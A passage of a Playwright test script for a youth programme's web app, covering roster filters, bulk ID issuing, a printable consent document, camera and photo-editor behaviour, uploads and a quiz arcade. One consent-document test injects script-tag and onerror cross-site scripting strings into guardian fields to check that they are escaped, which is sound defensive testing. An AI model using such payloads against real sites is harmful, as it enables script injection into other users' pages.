    }
    if (await roSel('Filter by school type', 'unknown')) {
      ok('…and "not recorded" finds the child nobody asked',
         await roRows() === 1 && /Dele Delta/.test(await ro.evaluate(() => document.body.innerText)));
    }
    if (await roSel('Filter by school type', '')) {
      ok('…and clearing it returns everyone', await roRows() === 4);
    }

    /* ── Children with no ID ──────────────────────────────────────────────────
     * The reported problem. A missing ID was a silent state: the roster looked
     * identical whether a child had one or not, so it was only ever discovered
     * when a parent rang up or a gate turned the child away. There was no way to
     * ask WHICH children, and the bulk action skipped exactly them.
     */
    /* The old single-purpose "No ID issued" option meant active AND no token.
       It is a PAIR of facets now, which is strictly more useful — the same
       question, plus the version somebody actually asks, narrowed to a centre. */
    const noIdOk = await roSel('Filter by ID issued', 'no') && await roSel('Filter by standing', 'active');
    ok('the roster can be asked which children have no ID', noIdOk && await roRows() === 2);
    const noIdText = await ro.evaluate(() => Array.from(document.querySelectorAll('.admin-table tbody tr'))
      .map(r => r.innerText.replace(/\s+/g, ' ')).join(' | '));
    ok('…and says so on the row, distinguishing "never issued" from "consent pending"',
      /Bode Beta/.test(noIdText) && /Dele Delta/.test(noIdText)
      && /no ID — consent pending/.test(noIdText) && /no ID issued/.test(noIdText)
      // The withdrawn child is not a gap to chase, and the one WITH a token is not either.
      && !/Chidi/.test(noIdText) && !/Amina/.test(noIdText));
    await roSel('Filter by ID issued', ''); await roSel('Filter by standing', '');

    /* The size of the job, before the button is pressed, split by what would
       actually fix each part — a bulk action whose size you cannot see is one
       people press once and never again. */
    roBody = await ro.evaluate(() => document.body.innerText);
    ok('the roster states how many have no ID, and what would fix each part',
      /3 verified children have no ID/.test(roBody)
      && /2 can be issued right now/.test(roBody)
      && /1 (is|are) held waiting on a photo decision/.test(roBody)
      && /1 child is still awaiting consent/.test(roBody));

    /* Pressing it: one action covering both halves, reported as two numbers.
       The toast host is mounted by App, which this fixture does not have, so the
       messages are captured at the call rather than read off the page — it is the
       string the component composes either way. */
    await ro.evaluate(() => {
      window.__said = { ok: [], bad: [] };
      window.dialog.confirm = () => Promise.resolve(true);
      window.toast.success = (m) => window.__said.ok.push(String(m));
      window.toast.error = (m) => window.__said.bad.push(String(m));
    });
    await ro.getByRole('button', { name: 'Send IDs to everyone' }).click();
    await ro.waitForTimeout(500);
    const bulkCall = await ro.evaluate(() => window.__bulk);
    ok('…and the bulk send goes out for everyone, not just one centre',
      !!bulkCall && bulkCall.scope === 'all' && !bulkCall.centre);
    const said = await ro.evaluate(() => window.__said);
    ok('…reporting what was issued and what was resent as separate numbers',
      said.ok.length === 1 && /2 newly issued/.test(said.ok[0]) && /1 resent/.test(said.ok[0]));
    /* Held children are named as a failure, not folded into the success line.
       "Sent 312" over a run that could not touch four of them reads as finished. */
    ok('…and the children it could not help are said separately, as a failure',
      said.bad.length === 1 && /1 still held/.test(said.bad[0]) && /photo pending/.test(said.bad[0]));

    // The bug: open Edit, save, and the guardian details survive.
    await ro.getByRole('button', { name: 'Edit' }).first().click();
    await ro.waitForTimeout(250);
    const seeded = await ro.evaluate(() => {
      const inputs = Array.from(document.querySelectorAll('.admin-table input.admin-input'));
      return inputs.map(i => i.value).filter(Boolean);
    });
    ok('the editor opens POPULATED, not blank (' + seeded.length + ' fields)',
      seeded.indexOf('Mrs Alpha') !== -1 && seeded.indexOf('08031110001') !== -1 && seeded.indexOf('12') !== -1);
    await ro.getByRole('button', { name: /^Save/ }).first().click();
    await ro.waitForTimeout(300);
    const rosterSaved = await ro.evaluate(() => window.__saved);
    ok('…so a save carries the guardian through instead of erasing them',
      !!(rosterSaved && rosterSaved.data && rosterSaved.data.guardianPhone === '08031110001' && rosterSaved.data.parentEmail === 'a@ex.co' && Number(rosterSaved.data.age) === 12));

    /* ── The consent record + its printable document ─────────────────────── */
    await ro.getByRole('button', { name: 'Consent' }).first().click();
    await ro.waitForTimeout(400);
    const consentDrawer = await ro.evaluate(() => { const el = document.querySelector('.admin-drawer-panel'); return el ? el.innerText : ''; });
    ok('the consent record opens for that child', /Consent record/.test(consentDrawer) && /Amina Alpha/.test(consentDrawer));
    ok('…listing every consent with who gave it and when',
      /Program participation/.test(consentDrawer) && /Mrs Alpha/.test(consentDrawer) && /2026-07-07/.test(consentDrawer));
    ok('…flagging which are required', /required/i.test(consentDrawer));
    ok('…and showing the append-only history behind the current standing',
      /HISTORY/.test(consentDrawer) && /4 ENTRIES/.test(consentDrawer));

    // The printable document is generated in-page; check the real output.
    const consentDoc = await ro.evaluate(() => {
      // A guardian name and a form answer carrying markup. These are values a
      // parent typed into a public form, so the document must escape them, not
      // render them — the printed page is opened in a browser.
      const c = { student: { studentId: 'STU-1', displayId: 'EG-26-001', fullName: 'Amina Alpha', age: 12, centre: 'Egbeda', track: 'Piano', enrolledAt: '2026-07-06T09:00:00Z' },
        guardian: { name: 'Mrs <script>alert(1)</script> Alpha', phone: '08031110001', email: 'a@ex.co' },
        registration: { status: 'verified', verifiedAt: '2026-07-07T10:00:00Z', answers: { school: 'St Mary <img src=x onerror=alert(2)>', fullName: 'Amina Alpha' } },
        items: [{ type: 'participation', label: 'Program participation', required: true, status: 'granted', actorName: 'Mrs Alpha', recordedAt: '2026-07-07T10:00:00Z' },
                { type: 'media', label: 'Photos & media', required: false, status: 'declined', actorName: 'Mrs Alpha', recordedAt: '2026-07-07T10:00:00Z' }],
        history: [], complete: true,
        programme: { name: 'LCASP 2026', website: 'next.afrovanguard.org.ng', phone: '+234' },
        generatedAt: '2026-07-27T12:00:00Z', generatedBy: 'Admin' };
      return window.consentDocumentHtml(c);
    });
    ok('the document is A4 with print margins, not a screenshot', /@page\s*{\s*size:\s*A4/.test(consentDoc) && /margin:\s*18mm/.test(consentDoc));
    ok('…carries the child, the guardian and every consent',
      /Amina Alpha/.test(consentDoc) && /08031110001/.test(consentDoc) && /Program participation/.test(consentDoc) && /Photos &amp; media/.test(consentDoc));
    ok('…states plainly whether the child is cleared', /cleared to participate/.test(consentDoc));
    ok('…has signature lines for the file', /signature/i.test(consentDoc));
    ok('…escapes what a parent typed rather than rendering it', (function () {
      // The hostile strings must appear, escaped, and never as live markup.
      return consentDoc.indexOf('<script>alert(1)') === -1
        && consentDoc.indexOf('&lt;script&gt;alert(1)') !== -1
        && consentDoc.indexOf('<img src=x') === -1
        && consentDoc.indexOf('&lt;img src=x') !== -1;
    })());
    ok('…and does not repeat fields it already shows', /St Mary/.test(consentDoc) && (consentDoc.match(/Amina Alpha/g) || []).length <= 3);

    // A blocked popup must not lose the document — printing goes via an iframe.
    const printed = await ro.evaluate(() => {
      let called = 0;
      const realOpen = window.open;
      window.open = function () { return null; };          // simulate a popup blocker
      const html = '<!doctype html><html><body>x</body></html>';
      const okd = window.printDocument(html, function () { called = -1; });
      window.open = realOpen;
      const frames = document.querySelectorAll('iframe').length;
      return { okd: okd, called: called, frames: frames };
    });
    ok('printing survives a popup blocker, because it uses an iframe',
      printed.okd === true && printed.frames >= 1);
    await ro.close();

    /* ── The camera can be flipped ────────────────────────────────────────
       Chromium's fake device reports a single camera, so enumerateDevices is
       stubbed to look like a phone: the flip is only offered when there is a
       second lens to flip to, and a one-camera tablet must not get a button
       that kills its preview. */
    const flipCtx = await browser.newContext({ permissions: ['camera'] });
    const fl = await flipCtx.newPage();
    await fl.addInitScript(() => {
      window.__facings = [];
      const realEnum = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices);
      const realGet = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
      navigator.mediaDevices.enumerateDevices = () => (window.__oneCamera
        ? Promise.resolve([{ kind: 'videoinput', deviceId: 'a', label: 'front' }])
        : Promise.resolve([{ kind: 'videoinput', deviceId: 'a', label: 'front' },
                           { kind: 'videoinput', deviceId: 'b', label: 'back' }]));
      navigator.mediaDevices.getUserMedia = (c) => {
        const f = c && c.video && c.video.facingMode;
        window.__facings.push(typeof f === 'object' ? (f.ideal || f.exact) : f);
        return realGet(c);
      };
    });
    await fl.goto(BASE + '/tests/_boards_fixture.html?board=gatephoto&mode=ok', { waitUntil: 'networkidle' });
    await fl.waitForTimeout(300);
    await fl.getByRole('button', { name: /Open camera/ }).first().click();
    await fl.waitForTimeout(1400);
    ok('the registration camera opens on the front lens',
      (await fl.evaluate(() => window.__facings))[0] === 'user');
    const flipBtn = fl.getByRole('button', { name: /Switch to the back camera/ });
    ok('…and offers a flip when the device has two cameras', await flipBtn.count() === 1);
    await flipBtn.click();
    await fl.waitForTimeout(1400);
    const facings = await fl.evaluate(() => window.__facings);
    ok('…which actually re-opens the stream on the rear lens (' + facings.join(' → ') + ')',
      facings[facings.length - 1] === 'environment');
    const mirrored = await fl.evaluate(() => {
      const v = document.querySelector('[role="dialog"] video');
      return v ? v.style.transform : null;
    });
    // A selfie reads naturally mirrored; a rear shot of someone else does not.
    ok('…and stops mirroring the preview once it is the rear camera', mirrored === 'none');
    ok('…with the stream still live after the flip', await fl.evaluate(() => {
      const v = document.querySelector('[role="dialog"] video');
      return !!(v && v.srcObject && v.srcObject.getVideoTracks().some(t => t.readyState === 'live'));
    }));
    await fl.close();

    // One camera → no flip button, because switching would kill the preview.
    const fl1 = await flipCtx.newPage();
    await fl1.addInitScript(() => { window.__oneCamera = true; });
    await fl1.addInitScript(() => {
      navigator.mediaDevices.enumerateDevices = () => Promise.resolve([{ kind: 'videoinput', deviceId: 'a', label: 'only' }]);
    });
    await fl1.goto(BASE + '/tests/_boards_fixture.html?board=gatephoto&mode=ok', { waitUntil: 'networkidle' });
    await fl1.waitForTimeout(300);
    await fl1.getByRole('button', { name: /Open camera/ }).first().click();
    await fl1.waitForTimeout(1400);
    ok('a single-camera device is not offered a flip',
      await fl1.getByRole('button', { name: /Switch to the/ }).count() === 0);
    await fl1.close();
    await flipCtx.close();

    // ── photo editor: zoom works, and previews without a round trip ──────
    const pe = await browser.newPage();
    const peErrs = [];
    pe.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) peErrs.push(m.text()); });
    pe.on('pageerror', e => peErrs.push(String(e.message)));
    await pe.goto(BASE + '/tests/_boards_fixture.html?board=photo&mode=ok', { waitUntil: 'networkidle' });
    await pe.waitForTimeout(500);
    ok('photo editor mounts with no script error', peErrs.length === 0);

    const tf = await pe.evaluate(() => {
      const f = window.buildEditTransform;
      const at = (z, g) => f({ gravity: g || 'center', zoom: z }, false);
      return {
        z15: at(1.5), z10: at(1.0), face: at(2, 'face'),
        baseSame: f({ gravity: 'center', zoom: 1 }, true) === f({ gravity: 'center', zoom: 2.4 }, true),
        anyPixelFraction: [1.001, 1.01, 2.5, 9].some((z) => {
          const m = /c_crop,g_\w+,w_([\d.]+)/.exec(at(z));
          return m && parseFloat(m[1]) >= 1;
        }),
      };
    });
    // z_ is a silent no-op in this chain, verified against Cloudinary — a zoom
    // built with it moves the slider and changes nothing.
    ok('zoom crops instead of emitting the no-op z_', /^c_crop,g_center,w_0\.667,h_0\.667\//.test(tf.z15) && tf.z15.indexOf('z_') === -1);
    ok('zoom 1x adds no crop', tf.z10.indexOf('c_crop') === -1);
    ok('zoom works for a detected-object gravity too', /^c_crop,g_face,w_0\.5,h_0\.5\//.test(tf.face));
    ok('crop fraction stays a ratio, never pixels', !tf.anyPixelFraction);
    ok('the preview base excludes zoom, so the slider needs no refetch', tf.baseSame);

    const slider = pe.locator('input[type=range]');
    ok('zoom slider offers only the range that can act (1–2.5)',
      await slider.getAttribute('min') === '1' && await slider.getAttribute('max') === '2.5');
    const shot = () => pe.evaluate(() => {
      const im = document.querySelector('img[alt=Preview]');
      return im ? { src: im.getAttribute('src'), tr: im.style.transform, origin: im.style.transformOrigin } : null;
    });
    const before = await shot();
    await slider.fill('1.8');
    await pe.waitForTimeout(150);
    const after = await shot();
    ok('dragging zoom changes the preview immediately', before && after && before.tr !== after.tr && /scale\(1.8\)/.test(after.tr));
    ok('…without swapping the image (no network round trip)', before.src === after.src);

    // ── Studio: a real editor that does not touch Cloudinary ─────────────
    await pe.getByRole('tab', { name: 'Studio' }).click();
    await pe.waitForSelector('.cropper-container', { timeout: 15000 }).catch(() => {});
    ok('Studio boots Cropper.js on the device', await pe.locator('.cropper-container').count() === 1);
    const studioCtl = await pe.evaluate(() =>
      Array.from(document.querySelectorAll('button')).map(b => b.textContent.trim()));
    ok('Studio offers rotate, flip and reset', ['90°', 'Flip', 'Reset'].every(t => studioCtl.some(x => x.indexOf(t) !== -1)));
    const sliders = await pe.locator('input[type=range]').count();
    ok('Studio offers straighten plus the three tone controls', sliders === 4);

    // rotateTo is absolute, so driving it from the straighten slider alone
    // would silently undo a 90° turn. Read Cropper's own state, not the DOM.
    const rotOf = () => pe.evaluate(() => {
      const el = document.querySelector('img[alt=Source]');
      return el && el.cropper ? el.cropper.getData().rotate : null;
    });
    await pe.getByRole('button', { name: /90°/ }).nth(1).click();
    const afterTurn = await rotOf();
    await pe.locator('input[type=range]').first().fill('6');
    await pe.waitForTimeout(150);
    const afterFine = await rotOf();
    const label = await pe.evaluate(() => document.body.innerText);
    ok('a 90° turn survives straightening (' + afterTurn + '° → ' + afterFine + '°)',
      afterTurn === 90 && afterFine === 96 && /\+90° turn/.test(label));

    // Leaving the tab must tear the instance down, not leak it.
    await pe.getByRole('tab', { name: 'Quick' }).click();
    await pe.waitForTimeout(200);
    ok('leaving Studio destroys the cropper', await pe.locator('.cropper-container').count() === 0);
    await pe.close();

    // ── upload shrinking ─────────────────────────────────────────────────
    const shrink = await (async () => {
      const p2 = await browser.newPage();
      await p2.goto(BASE + '/tests/_boards_fixture.html?board=photo&mode=ok', { waitUntil: 'networkidle' });
      const out = await p2.evaluate(async () => {
        const T = await window.NGGApi.imageTools();
        const c = document.createElement('canvas'); c.width = 3200; c.height = 2400;
        const x = c.getContext('2d');
        for (let i = 0; i < 3200; i += 6) { x.fillStyle = i % 12 ? '#eee' : '#333'; x.fillRect(i, 0, 3, 2400); }
        const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.95));
        const f = new File([blob], 'p.jpg', { type: 'image/jpeg' });
        const big = await T.prepare(f, { maxPx: 1600, quality: 0.86 });
        const sc = document.createElement('canvas'); sc.width = 300; sc.height = 400;
        sc.getContext('2d').fillRect(0, 0, 300, 400);
        const sblob = await new Promise(r => sc.toBlob(r, 'image/jpeg', 0.8));
        const small = await T.prepare(new File([sblob], 's.jpg', { type: 'image/jpeg' }), { maxPx: 1600 });
        return { before: f.size, after: big.after, w: big.width, skipped: big.skipped, smallSkipped: small.skipped };
      });
      await p2.close();
      return out;
    })();
    ok('a phone-sized photo is resampled before upload (' + Math.round(shrink.before / 1024) + 'KB → ' + Math.round(shrink.after / 1024) + 'KB, ' + shrink.w + 'px wide)',
      !shrink.skipped && shrink.w === 1600 && shrink.after < shrink.before / 2);
    ok('an already-small image is left alone (no needless re-encode)', shrink.smallSkipped);

    // ── and the upload path actually uses it ─────────────────────────────
    // Measuring the library in isolation would still pass if uploadFile sent
    // the original, so this drives the real client and weighs what leaves.
    const up = await browser.newPage();
    let sentBytes = 0;
    await up.route('**/api/public/upload-headshot-sign.php', (route) => route.fulfill({
      status: 200, contentType: 'application/json',
      body: JSON.stringify({ ok: true, apiKey: 'k', timestamp: 1, signature: 's', folder: 'f',
        uploadUrl: BASE + '/__upload_sink' }),
    }));
    await up.route('**/__upload_sink', (route) => {
      const buf = route.request().postDataBuffer();
      sentBytes = buf ? buf.length : 0;
      return route.fulfill({ status: 200, contentType: 'application/json',
        body: JSON.stringify({ secure_url: 'https://res.cloudinary.com/x/image/upload/v1/a.jpg', public_id: 'a' }) });
    });
    await up.goto(BASE + '/tests/_upload_fixture.html', { waitUntil: 'networkidle' });
    const orig = await up.evaluate(async () => {
      const c = document.createElement('canvas'); c.width = 3200; c.height = 2400;
      const x = c.getContext('2d');
      for (let i = 0; i < 3200; i += 6) { x.fillStyle = i % 12 ? '#eee' : '#333'; x.fillRect(i, 0, 3, 2400); }
      const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.95));
      const f = new File([blob], 'big.jpg', { type: 'image/jpeg' });
      await window.NGGApi.uploadFile(f, 'headshot');
      return f.size;
    });
    await up.close();
    ok('uploadFile puts the resampled image on the wire, not the original ('
      + Math.round(orig / 1024) + 'KB → ' + Math.round(sentBytes / 1024) + 'KB sent)',
      sentBytes > 0 && sentBytes < orig / 2);
    /* ── The Arcade ────────────────────────────────────────────────────────
     * Scoring lives on the server, so what matters on this side is that the
     * right thing is SENT: the answers indexed against the questions they were
     * chosen for, and exactly one submission per round. Both have a way of
     * looking fine on screen while being wrong on the wire. */
    const arc = await browser.newPage();
    const arcErrs = [];
    arc.on('pageerror', e => arcErrs.push(String(e.message)));
    await arc.goto(BASE + '/tests/_boards_fixture.html?board=arcade&mode=ok', { waitUntil: 'networkidle' });
    await arc.waitForSelector('.arc-card', { timeout: 15000 });
    const arcHome = await arc.evaluate(() => document.body.innerText);
    ok('the Arcade mounts with no script error', arcErrs.length === 0);
    if (arcErrs.length) console.error('       ', arcErrs.slice(0, 3).join(' | '));
    ok('…and lists every game in the catalogue',
       await arc.evaluate(() => document.querySelectorAll('.arc-card').length) === 4);
    ok('…with exactly one flagged as today\'s challenge',
       await arc.evaluate(() => document.querySelectorAll('.arc-card.is-daily').length) === 1);
    ok('…which is the one the hero offers to play', /Naija Know-How/.test(arcHome.split('Leaderboard')[0]));
    /* Read out of their own cells, not matched anywhere in the page text: the
       board is full of numbers and a bare /\b4\b/ would pass on a coincidence.
       The mentor-star figure in particular is READ from the payload — if the
       arcade ever starts computing one of its own, this stops matching. */
    const arcStats = await arc.evaluate(() => {
      const out = {};
      document.querySelectorAll('.arc-stats > div').forEach(d => {
        out[d.querySelector('dt').textContent.trim()] = d.querySelector('dd').textContent.trim();
      });
      return out;
    });
    ok('…the streak, plays and mentor stars are the server\'s numbers (' + JSON.stringify(arcStats) + ')',
       arcStats['Day streak'] === '4\u{1F525}' && arcStats['Rounds played'] === '4'
       && arcStats['Mentor stars'] === '7\u2B50');
    ok('…a game with a best score shows it, and one never played says so',
       /140/.test(arcHome) && /Not played yet/.test(arcHome));

    // Leaderboard: the viewer's own row must survive being off the visible end.
    ok('the leaderboard renders the ranked players', /Zainab K\./.test(arcHome) && /Emeka O\./.test(arcHome));
    ok('…and a player ranked off the end of the board still sees their own row',
       /Amaka A\./.test(arcHome) && /37/.test(arcHome));
    ok('…marked as theirs', await arc.evaluate(() => !!document.querySelector('.arc-board-row.is-me')));
    ok('…and the board says which programme it is for, so the two never look shared',
       /Summer School board/.test(arcHome));

    /* Play a round. Question 2 is answered, then Back, then question 1 — the
       order that breaks an implementation keying answers off "the current
       index at submit time" rather than off the question. */
    await arc.evaluate(() => Array.from(document.querySelectorAll('.arc-card')).find(c => /Naija/.test(c.textContent)).querySelector('.arc-play').click());
    await arc.waitForSelector('.arc-opt', { timeout: 10000 });
    ok('starting a game opens a round', (await arc.evaluate(() => window.__starts)).join() === 'naija');
    ok('…showing the first question and its options',
       await arc.evaluate(() => document.querySelectorAll('.arc-opt').length) === 4
       && /Capital of Ekiti/.test(await arc.evaluate(() => document.body.innerText)));

    const arcPick = (n) => arc.evaluate((i) => document.querySelectorAll('.arc-opt')[i].click(), n);
    const arcNext = () => arc.evaluate(() => document.querySelector('.arc-next').click());
    await arcPick(1);                    // Q1 → option B
    await arcNext();
    await arc.waitForFunction(() => /Bayelsa/.test(document.body.innerText), null, { timeout: 5000 });
    await arcPick(3);                    // Q2 → option D
    await arc.evaluate(() => document.querySelector('.arc-sec').click());   // Back to Q1
    await arc.waitForFunction(() => /Ekiti/.test(document.body.innerText), null, { timeout: 5000 });
    ok('going back to an answered question shows the answer still selected',
       await arc.evaluate(() => document.querySelectorAll('.arc-opt')[1].getAttribute('aria-checked') === 'true'));
    await arcPick(0);                    // change Q1 → option A
    await arcNext();                     // → Q2
    await arcNext();                     // → Q3 (unanswered)
    await arc.waitForFunction(() => /Zamfara/.test(document.body.innerText), null, { timeout: 5000 });
    await arc.evaluate(() => document.querySelector('.arc-next.is-finish').click());
    await arc.waitForSelector('.arc-score', { timeout: 10000 });

    const sent = await arc.evaluate(() => window.__submits);
    ok('finishing submits the round exactly once', sent.length === 1 && sent[0].roundId === 'AR-TESTROUND');
    /* Q1 was changed from B to A, Q2 is D, Q3 was never answered. Anything
       other than ['0','3',''] means the answers drifted off their questions. */
    ok('…with each answer against the question it was chosen for (' + JSON.stringify(sent[0] && sent[0].answers) + ')',
       sent.length === 1 && sent[0].answers.length === 3
       && sent[0].answers[0] === '0' && sent[0].answers[1] === '3' && sent[0].answers[2] === '');

    const arcRes = await arc.evaluate(() => document.body.innerText);
    ok('the result screen shows the score the server returned', /47/.test(arcRes));
    ok('…broken down rather than as one opaque number', /\+20/.test(arcRes) && /\+7/.test(arcRes));
    ok('…flags a personal best', /New personal best/i.test(arcRes));
    ok('…and shows what was missed, now the round is closed', /you put/.test(arcRes));
    await arc.close();

    /* The clock running out has to submit — once. The expiry tick and a tap on
       Finish can land in the same frame, and a second submission comes back
       "already played" over the top of a real score. */
    const arcT = await browser.newPage();
    const arcTErrs = [];
    arcT.on('pageerror', e => arcTErrs.push(String(e.message)));
    await arcT.goto(BASE + '/tests/_boards_fixture.html?board=arcade&mode=ok&fast=1', { waitUntil: 'networkidle' });
    await arcT.waitForSelector('.arc-card', { timeout: 15000 });
    await arcT.evaluate(() => document.querySelector('.arc-card .arc-play').click());
    // Not waitForSelector: a clock that never fires is a legitimate failure of
    // the first assertion below, not a harness crash that takes the rest of
    // the run with it.
    let arcTGraded = true;
    try { await arcT.waitForSelector('.arc-score', { timeout: 12000 }); }
    catch (_) { arcTGraded = false; }
    // The grade is held for 1200ms in fast mode, so the countdown goes on
    // ticking behind it. Wait past that for any stray second submission.
    await arcT.waitForTimeout(900);
    const timedOut = await arcT.evaluate(() => window.__submits);
    await arcT.close();
    ok('a round whose clock runs out submits itself without being told',
       arcTErrs.length === 0 && arcTGraded && timedOut.length >= 1);
    ok('…exactly once, however the ticking clock and a slow grade overlap (' + timedOut.length + ')',
       timedOut.length === 1);

    /* ── The Arcade is legible where it actually renders ───────────────────
     * The first version of the Arcade stylesheet assumed a dark surface. The
     * community SIDEBAR is dark navy, but the main column it renders into —
     * .cm-col — is #fff, so it shipped as white text on white: twelve of
     * fourteen measured pairs under 4.5:1 and most at 1.00, meaning invisible.
     * It looked fine in isolation, which is exactly why this mounts it inside
     * the real community shell and measures rather than eyeballing. */
    const arcC = await browser.newPage();
    await arcC.goto(BASE + '/tests/_boards_fixture.html?board=arcade&mode=ok&css=1', { waitUntil: 'networkidle' });
    await arcC.waitForSelector('.arc-card', { timeout: 15000 });
    // Wait for the stylesheets to APPLY, not merely load — they are injected as
    // <link> elements, and networkidle fires before the styles take effect.
    await arcC.waitForFunction(() => getComputedStyle(document.querySelector('.arc-card')).borderRadius !== '0px',
                               null, { timeout: 10000 });
    await arcC.evaluate(() => {
      const root = document.getElementById('root');
      const wrap = document.createElement('div');
      wrap.className = 'cm-slack-page';
      wrap.innerHTML = '<div class="cm-slack"><main class="cm-col"><div class="cm-stream is-feed" id="cmslot"></div></main></div>';
      root.parentNode.insertBefore(wrap, root);
      document.getElementById('cmslot').appendChild(root);
    });
    const contrast = await arcC.evaluate(() => {
      const lum = (r, g, b) => { const f = (c) => { c /= 255; return c <= 0.03928 ? c / 12.92 : Math.pow((c + 0.055) / 1.055, 2.4); };
        return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b); };
      const num = (s) => (String(s).match(/[\d.]+/g) || [0, 0, 0]).map(Number);
      // Walk to the nearest OPAQUE backdrop. A translucent layer over white is
      // still white, which is the trap the original stylesheet fell into.
      const backdrop = (el) => {
        let n = el;
        while (n) {
          const c = getComputedStyle(n).backgroundColor, m = num(c);
          if (c !== 'rgba(0, 0, 0, 0)' && c !== 'transparent' && (m.length < 4 || m[3] === 1)) return m;
          n = n.parentElement;
        }
        return [255, 255, 255];
      };
      const out = [];
      document.querySelectorAll('.arc *').forEach((el) => {
        const t = (el.textContent || '').trim();
        if (!t || el.children.length > 0) return;
        const f = num(getComputedStyle(el).color), g = backdrop(el);
        const a = f[3] === undefined ? 1 : f[3];
        const c = [0, 1, 2].map(i => f[i] * a + g[i] * (1 - a));
        const L1 = lum(c[0], c[1], c[2]), L2 = lum(g[0], g[1], g[2]);
        out.push({ cls: String(el.className || el.tagName), ratio: (Math.max(L1, L2) + 0.05) / (Math.min(L1, L2) + 0.05) });
      });
      return out;
    });
    await arcC.close();
    const worst = contrast.slice().sort((a, b) => a.ratio - b.ratio)[0];
    // Control: an all-transparent or unstyled render would produce nothing to
    // measure, and "no failures" would then be meaningless.
    ok('the arcade has text to measure on the community surface (' + contrast.length + ' nodes)',
       contrast.length >= 15);
    ok('…and every piece of it clears 4.5:1 there (worst: '
       + (worst ? worst.ratio.toFixed(2) + ' on .' + String(worst.cls).split(' ')[0] : 'n/a') + ')',
       contrast.every(c => c.ratio >= 4.5));


    /* ── The Math Lab ──────────────────────────────────────────────────────
     * A ladder rather than a leaderboard, and the two things that can look
     * right on screen while being wrong are the same two the Arcade has: a
     * locked level that is only VISUALLY locked, and answers that go up
     * indexed against the wrong questions. Both are read off the wire here.  */
    const ml = await browser.newPage();
    const mlErrs = [];
    ml.on('pageerror', e => mlErrs.push(String(e.message)));
    await ml.goto(BASE + '/tests/_boards_fixture.html?board=arcade&mode=ok', { waitUntil: 'networkidle' });
    await ml.waitForSelector('.ml-teaser', { timeout: 15000 });
    ok('the Math Lab band mounts in the Arcade with no script error', mlErrs.length === 0);
    if (mlErrs.length) console.error('       ', mlErrs.slice(0, 3).join(' | '));
    const mlTeaser = await ml.evaluate(() => document.querySelector('.ml-teaser').innerText);
    ok('…and names the level you are actually on, not just the feature',
       /Indices & Logarithms/.test(mlTeaser));
    ok('…and says how far up the ladder you are', /2 of 5 levels cleared/.test(mlTeaser));

    await ml.evaluate(() => document.querySelector('.ml-teaser .arc-cta').click());
    await ml.waitForSelector('.ml-ladder', { timeout: 10000 });
    ok('opening it lists every level, locked ones included',
       await ml.evaluate(() => document.querySelectorAll('.ml-lv').length) === 5);
    ok('…with the cleared ones marked',
       await ml.evaluate(() => document.querySelectorAll('.ml-lv.is-cleared').length) === 2);

    /* The whole point of the rewrite. Surds (4) is shut because Indices (3) is
       not cleared, while Quadratics (5) — which needs only Algebraic Processes
       — is open. On the old linear ladder that was impossible: a level was
       open if and only if the one below it was cleared, so a student could not
       reach anything past the first thing they were stuck on. */
    ok('a level is open when ITS OWN prerequisites are cleared, not when the one below it is',
       await ml.evaluate(() => {
         const open = Array.from(document.querySelectorAll('.ml-lv.is-open'))
           .map(l => l.querySelector('.ml-lv-h').textContent);
         return open.length === 2
             && open.indexOf('Quadratic Equations') >= 0
             && open.indexOf('Surds') < 0;
       }));

    /* A locked level must have NO control at all, not a disabled one: a
       disabled button is skipped by the keyboard and explains nothing, and the
       reason is the entire message. And the reason is a NAME — "clear level 3"
       makes a student count rungs to work out what level 3 was. */
    ok('a locked level offers no button to press, and names the work that opens it',
       await ml.evaluate(() => {
         const shut = Array.from(document.querySelectorAll('.ml-lv.is-locked'));
         return shut.length === 1
             && shut.every(l => l.querySelector('button') === null)
             && /Needs Indices & Logarithms/.test(shut[0].innerText);
       }));

    /* Grouping, and the filter that makes twenty-one levels navigable. */
    ok('the levels are grouped under their strand, in the order the server sends',
       await ml.evaluate(() => {
         const heads = Array.from(document.querySelectorAll('.ml-group-h'))
           .map(h => h.firstChild.textContent.trim());
         return heads.join('|') === 'Number|Algebra';
       }));
    /* Size is measured on the styled phone pass below — this fixture is
       deliberately unstyled, so a box measured here would mean nothing. */
    ok('…and every strand chip is a real button carrying its own pressed state',
       await ml.evaluate(() => {
         const chips = Array.from(document.querySelectorAll('.ml-strand'));
         return chips.length === 3                       // All + two strands
             && chips.every(c => c.tagName === 'BUTTON' && c.hasAttribute('aria-pressed'))
             && chips.filter(c => c.getAttribute('aria-pressed') === 'true').length === 1;
       }));
    await ml.evaluate(() => Array.from(document.querySelectorAll('.ml-strand'))
      .find(c => /^Number/.test(c.textContent)).click());
    ok('…and picking one narrows the list to that strand and says so out loud',
       await ml.evaluate(() => {
         const live = document.querySelector('.ml-count');
         return document.querySelectorAll('.ml-lv').length === 1
             && document.querySelectorAll('.ml-group-h').length === 1
             && live && live.getAttribute('role') === 'status'
             && /1 number level/i.test(live.textContent);
       }));
    await ml.evaluate(() => document.querySelectorAll('.ml-strand')[0].click());   // back to All

    /* Difficulty progression on the ladder. Clearing a level does not finish
       it — it promotes the paper — and the ladder is where a student decides
       what to do next, so that has to be legible from here. Level 1 was
       cleared at 92% and level 2 at 74%, so one shows Stretch and one
       Standard: if the promotion rule were ignored they would read alike. */
    ok('a cleared level says which paper it will set next, and the two differ',
       await ml.evaluate(() => {
         const said = Array.from(document.querySelectorAll('.ml-lv.is-cleared .ml-lv-stage'))
           .map(p => p.textContent.replace(/\s+/g, ' ').trim());
         return said.length === 2
             && /^Stretch paper next/.test(said[0])
             && /^Standard paper next/.test(said[1]);
       }));
    /* …and an untouched level does NOT, because "Foundation paper — gentler
       forms first" on every one of them is the same sentence eleven times. */
    ok('…and an untouched level does not repeat the boilerplate',
       await ml.evaluate(() =>
         document.querySelectorAll('.ml-lv.is-open .ml-lv-stage').length === 0));

    /* Start the third level — by its number, which is not its array index. */
    await ml.evaluate(() => document.querySelectorAll('.ml-lv')[2].querySelector('.ml-go').click());
    await ml.waitForSelector('.ml-qs', { timeout: 10000 });
    ok('starting a level asks the server for that level, not its position in the list',
       (await ml.evaluate(() => window.__mathStarts)).join() === '3');
    /* The ramp inside a paper. The questions arrive in tier order, and the
       point where they get harder is marked — a paper that simply gets harder
